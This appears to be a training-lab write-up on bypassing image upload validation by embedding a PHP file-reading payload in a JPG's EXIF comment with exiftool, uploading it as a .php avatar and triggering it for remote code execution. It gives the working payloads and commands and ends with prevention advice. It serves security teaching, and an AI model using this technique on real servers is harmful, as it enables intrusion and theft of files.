# 🖼️➡️💻 Remote Code Execution — Polyglot PHP/JPG Web Shell Upload

## 🎯 Objective
- Exploit image validation mechanisms by:
  - Creating valid image/PHP polyglot files
  - Embedding PHP payloads into metadata
  - Passing strict image validation
  - Achieving remote code execution
  - Extracting sensitive server files

---

## ❗ Why This Matters

- Advanced upload defenses often verify:
  - Magic bytes
  - MIME types
  - File structure
- Polyglot files bypass these by:
  - Remaining valid images
  - Containing executable code
- Demonstrates parser confusion between:
  - Image validators
  - Web servers

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Standard PHP Upload Failure

## 1️⃣ Direct Web Shell Attempt

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
````

---

### Result:

- ❌ Rejected

---

### Observation:

- ✔️ Server performs genuine image validation
- ✔️ Prior bypasses ineffective

---

## ⚠️ Security Insight

```text 
Application validates actual image structure, not just extension or MIME
```

---

# 🚀 Part 2 — Polyglot Creation

## 2️⃣ Build PHP/JPG Hybrid

### Tool:

```bash 
exiftool
```

---

### Command:

```bash 
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

---

### Function:

- ✔️ Valid JPG preserved
- ✔️ PHP injected into EXIF Comment field
- ✔️ File extension changed to `.php`

---

### Result:

- ✔️ Uploadable image
- ✔️ Executable PHP shell

---

# 🚀 Part 3 — Upload Polyglot

## 3️⃣ Avatar Upload

### Action:

- Upload `polyglot.php`

---

### Result:

- ✔️ Upload successful

---

### Security Insight:

```text 
Validator confirms image structure but ignores executable metadata
```

---

# 🚀 Part 4 — Trigger Payload

## 4️⃣ Access Uploaded File

```http 
GET /files/avatars/polyglot.php
```

---

### Response Analysis:

- Search for:

  ```text 
  START ... END
  ```

---

### Outcome:

- ✔️ PHP executed from metadata
- ✔️ Carlos’s secret extracted
- ✔️ Valid image still served
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Strict validation bypassed
* Polyglot image created
* PHP hidden in metadata
* Server executed embedded payload
* Sensitive data extracted

---

## 🧠 Key Takeaways

* File structure validation alone is insufficient
* Metadata fields can contain executable code
* Polyglot attacks exploit parser differences
* Image processing ≠ execution prevention
* Web servers may parse image files as PHP if extension allows

---

## 🔥 Core Vulnerability

```text 
Image validation trusted file structure while PHP engine executed malicious metadata in uploaded polyglot file
```

---

## 🛡️ Prevention

* Re-encode:

  * Uploaded images
* Strip:

  * Metadata
* Rename:

  * Uploaded files
* Enforce:

  * Safe extensions
* Disable:

  * Script execution
* Store:

  * Outside web root
* Use:

  * Dedicated image processing pipelines

---

## ⚠️ Security Principle

```text 
If one parser approves and another executes, polyglots win
```

---

## 🏁 Status

- ✔️ Lab Completed
